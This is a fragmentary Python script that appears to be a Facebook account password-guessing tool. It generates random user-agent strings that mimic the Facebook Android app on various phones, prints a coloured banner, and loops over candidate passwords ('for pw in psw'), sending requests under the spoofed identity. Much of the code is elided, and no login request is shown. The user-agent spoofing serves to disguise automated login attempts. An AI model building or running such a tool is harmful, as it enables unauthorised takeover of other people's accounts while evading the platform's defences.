...
def random_dalvik_ua_m1():
    android_versions = ["10", "11", "12", "13", "14"]
    
    devices = [
        ("Xiaomi", "Redmi Note 11", "SP1A.210812.016", "1080", "2400", "2.0"),
        ("Samsung", "Galaxy A32", "RP1A.200720.012", "1080", "2400", "2.0"),
        ("Realme", "Realme 9i", "TP1A.220624.014", "1080", "2412", "2.0"),
        ("Oppo", "A54", "QKQ1.200830.002", "720", "1600", "2.0"),
        ("Vivo", "Y21", "RP1A.200720.012", "720", "1600", "2.0"),
        ("Infinix", "Hot 12", "SP1A.210812.016", "720", "1612", "2.0"),
    ]
    
    fb_versions = [
        ("FBAV/412.0.0.24.115", "FBBV/56543211"),
        ("FBAV/409.0.0.32.106", "FBBV/55432892"),
        ("FBAV/403.0.0.21.97",  "FBBV/54192764"),
        ("FBAV/399.0.0.18.93",  "FBBV/53011872"),
    ]
...
def random_dalvik_ua_all():
    ...
    devices = [
        ...
        # Samsung
        ("Samsung", "Galaxy A32", "RP1A.200720.012", "1080", "2400", "2.0"),
        ("Samsung", "Galaxy A51", "SP1A.210812.016", "1080", "2400", "2.0"),
        ...
        # Infinix
        ("Infinix", "Hot 12", "SP1A.210812.016", "720", "1612", "2.0"),
        ("Infinix", "Note 11", "RP1A.200720.012", "1080", "2460", "2.0"),

        # Tecno
        ("Tecno", "Spark 8C", "SP1A.210812.016", "720", "1612", "2.0"),
        ("Tecno", "Pova 3", "TP1A.220624.014", "1080", "2460", "2.0"),

        # OnePlus
        ("OnePlus", "Nord 2", "RP1A.200720.012", "1080", "2400", "2.0"),
        ("OnePlus", "9 Pro", "SP1A.210812.016", "1440", "3216", "3.0"),

        # Google Pixel
        ("Google", "Pixel 6", "SP1A.210812.016", "1080", "2400", "2.0"),
    ...
    fb_versions = [
        ...
        ("FBAV/403.0.0.21.97",  "FBBV/54192764"),
        ("FBAV/399.0.0.18.93",  "FBBV/53011872"),
        ("FBAV/390.0.0.30.89",  "FBBV/51823741"),
    ]
...
\033[92;1m[\033[91;1m●\033[92;1m] VERSION     \033[91;1m●\033[92;1m 4.2
\33[1;37m==============================================""")
def linex():
        print(f"\33[1;37m==============================================""")
def clear():
        ...
        try:
            ...
            for pw in psw:
                ...
                with requests.Session() as session:
                    ...
                    headers={'User-Agent':random_dalvik_ua_m1(),
